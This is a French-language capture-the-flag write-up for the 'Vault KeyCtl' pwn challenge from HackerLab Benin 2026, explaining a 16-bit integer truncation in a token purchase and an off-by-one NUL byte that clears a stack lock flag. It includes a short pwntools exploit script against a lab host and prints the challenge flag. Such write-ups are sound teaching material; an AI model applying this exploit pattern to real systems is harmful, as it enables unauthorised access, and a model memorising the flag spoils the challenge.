---
title: "Vault KeyCtl · Truncation entière + OOB"
platform: "HackerLab Benin 2026"
category: "pwn"
difficulty: "—"
points: 0
os: "—"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/pwn/vault-keyctl.md"
tags: [hackerlab-benin-2026, pwn]
status: published
---

# Vault KeyCtl : Pwn · Integer truncation + OOB null byte

**Catégorie** : pwn  
**Flag** : `HLB2026{da404f25bb9f4a874b0eabe0f7ec4b1c}`

## TL;DR

Le CLI HSM `vault-keyctl` a deux vulnérabilités chaînées : un overflow entier sur l'achat de tokens (coût vérifié sur 16 bits seulement) et un null byte OOB lors de la saisie du PIN (NUL terminal écrit hors du buffer PIN, écrase un flag de verrouillage sur la stack). Les deux combinés donnent accès à l'export de la master key.

## Analyse

### Vulnérabilité 1 : integer truncation sur Token Market

La commande `buy` calcule le coût `qty * 50` en 32 bits, mais la comparaison avec le solde (`cmp dx, credits`) n'utilise que les 16 bits de poids faible (`dx`). Un dépassement fait repasser le coût apparent à zéro.

Avec `qty=1311` : `1311 * 50 = 65550`. En 16 bits : `65550 & 0xffff = 14`. Le solde initial est 1000 crédits, donc `14 ≤ 1000` passe. On obtient 1311 tokens, ce qui dépasse le seuil de 500 tokens requis pour le niveau `ELEVATED`.

```
buy qty=1311
```

### Vulnérabilité 2 : null byte OOB sur le PIN

La commande `export` demande un PIN. `movb 0, pin[len]` place le terminateur NUL à `pin[maxlen]` (position 16 sur un buffer de 16 bytes). Ce NUL écrase un octet de `lock_flag` adjacent sur la stack à `rsp+0x30`.

La vérification FNV-1a du PIN est calculée mais jamais comparée au résultat attendu. Il suffit de fournir un PIN de 16 caractères quelconques pour déclencher l'écriture du NUL et déverrouiller l'export.

```
export PIN=AAAAAAAAAAAAAAAA
```

## Exploitation complète

```python
from pwn import *

io = remote("172.28.27.2", 9000)
io.sendlineafter(b"> ", b"buy qty=1311")
io.sendlineafter(b"> ", b"export")
io.sendlineafter(b"PIN: ", b"A" * 16)
io.recvuntil(b"FLAG")
print(io.recvline())
```

La master key est affichée via `getenv("FLAG")` après déverrouillage :

```
HLB2026{da404f25bb9f4a874b0eabe0f7ec4b1c}
```

## À retenir

Les vérifications de coût sur des valeurs tronquées (`cmp dx` au lieu de `cmp eax`) sont un pattern récurrent dans les CTF pwn. Un NUL terminal hors-bounds sur la stack peut suffire à bypasser une guard variable si elle est adjacente au buffer en mémoire.
